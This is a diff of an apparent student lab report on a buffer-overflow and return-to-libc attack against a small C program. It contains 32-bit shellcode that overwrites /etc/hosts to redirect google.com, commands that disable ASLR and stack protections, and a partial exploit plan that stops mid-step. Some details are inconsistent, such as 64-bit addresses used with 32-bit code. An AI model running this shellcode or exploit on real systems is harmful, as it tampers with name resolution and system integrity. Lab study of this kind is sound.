@@ -10,13 +10,181 @@
 -   Write step-by-step explanation and clearly comment on instructions and screenshots that you have made to successfully accomplished the attack.
     **Answer 1**: Must conform to below structure:
 
-Description text (optional)
+## 1. Preprocessing the given shellcode
+
+```shell
+global _start
+
+section .text
+
+_start:
+    xor ecx, ecx
+    mul ecx
+    mov al, 0x5
+    push ecx
+    push 0x7374736f     ;/etc///hosts
+    push 0x682f2f2f
+    push 0x6374652f
+    mov ebx, esp
+    mov cx, 0x401       ;permmisions
+    int 0x80            ;syscall to open file
+
+    xchg eax, ebx
+    push 0x4
+    pop eax
+    jmp short _load_data    ;jmp-call-pop technique to load the map
+
+_write:
+    pop ecx
+    push 20             ;length of the string, dont forget to modify if changes the map
+    pop edx
+    int 0x80            ;syscall to write in the file
+
+    push 0x6
+    pop eax
+    int 0x80            ;syscall to close the file
+
+    push 0x1
+    pop eax
+    int 0x80            ;syscall to exit
+
+_load_data:
+    call _write
+    google db "127.1.1.1 google.com"
 
 ```
-    code block (optional)
+
+The above code is saved as `sh.asm`.
+
+### 1.1. Compile the shellcode
+
+First, we have to compile the shellcode given by the problem so that we can retrieve a hextring and inject it into the program.
+
+```bash
+nasm -g -f elf sh.asm
 ```
 
-output screenshot (optional)
+A new file called `sh.o` is created.
+
+![Pic sh.o](./img/sh.o.png)
+
+### 1.2. Link the object file to created executable
+
+Then, link the newly created file to create executable file:
+
+```bash
+ld -m elf_i386 -s -o sh sh.o
+```
+
+Result:
+
+![Pic sh](./img/sh.png)
+
+### 1.3. Generated hex string from shellcode
+
+Since we will conduct the buffer overflow attack, we have to generated hex string from shellcode, so that we can inject through input.
+
+To generated the hexstring and print it onto terminal:
+
+```bash
+for i in $(objdump -d sh |grep "^ "|cut -f2); do echo -n '\x'$i; done; echo
+```
+
+![hex string](./img/hexstring.png)
+
+For later use, I will copy the output and paste into `hex.txt`
+
+## 2. Analyze the vulnerable code
+
+```C
+#include <stdio.h>
+#include <string.h>
+
+int main(int argc, char* argv[])
+{
+	char buffer[16];
+	strcpy(buffer,argv[1]);
+	return 0;
+}
+```
+
+Saved as `vuln.c`.
+
+The above code is vulnerable to buffer overflow attack because:
+
+1.  The `buffer` is a character array with a size of 16 bytes.
+2.  The strcpy function is a vulnerable function. It copies data from `argv[1]` directly into `buffer` without verifying the 16-bytes limit.
+
+We can attack the program by providing an input that exceed the 16-bytes limit and overwrite the return address
+
+We have the stack frame of the program:
+
+![stack frame](./img/stackframe.png)
+
+We can easily see that from esp to eip, there are 24 bytes, with 16 bytes of `buf`, 4 bytes of `ebp`, and 4 bytes of `eip`.
+
+The hexstring we generated above contains 77 bytes (by using `Ctrl + F` to find the number of occurrences of the letter `x`):
+
+![x](./img/x.png)
+
+Since the hexstring is too large for the buffer, we can't overwrite the return address directly, so I will use `system()` to execute it.
+
+By replacing the return address with `system()`'s address, and replace `argc` with the address of `exit()`, I will be able to run the shellcode. And, argv will be the arguments for `system()`.
+
+## 3. Compiling the vulnerable program
+
+### 3.1. Preparing the environment
+
+1. Turn off OS's address space layout randomization (ASLR)
+
+```bash
+sudo sysctl -w kernel.randomize_va_space=0
+```
+
+2. Switch to zsh to bypass bash protections
+
+```bash
+sudo ln -sf /bin/zsh /bin/sh
+```
+
+### 3.2. Compile the vulnerable program
+
+To compile we use the following command, with `-fno-stack-protector` to disables stack canaries (which protects against buffer overflows) and `-z execstack` to make stack executable:
+
+```bash
+gcc -g vuln.c -o vuln.out -fno-stack-protector -mpreferred-stack-boundary=3 -z execstack
+```
+
+### 3.2. Run the vulnerable program
+
+Using gdb:
+
+```bash
+gdb vuln.out -q
+```
+
+Set a breakpoint at `main()` and run:
+
+```
+break main
+run
+```
+
+Then to find the address of `system()` and `exit()`:
+
+```bash
+p system
+
+p exit
+```
+
+![alt text](./img/sys_addr.png)
+
+From the output, the address of `system()` is `0x7ffff7ddad70` and the address of `exit()` is `0x7ffff7dcf5f0`
+
+### 3.3. Craft the input
+
+First, we have to fill the 16 b ytes of `buffer`, then, we overwrite the address of `eip` and replace it with the address of `system()`
 
 **Conclusion**: comment text about the screenshot or simply answered text for the question
 
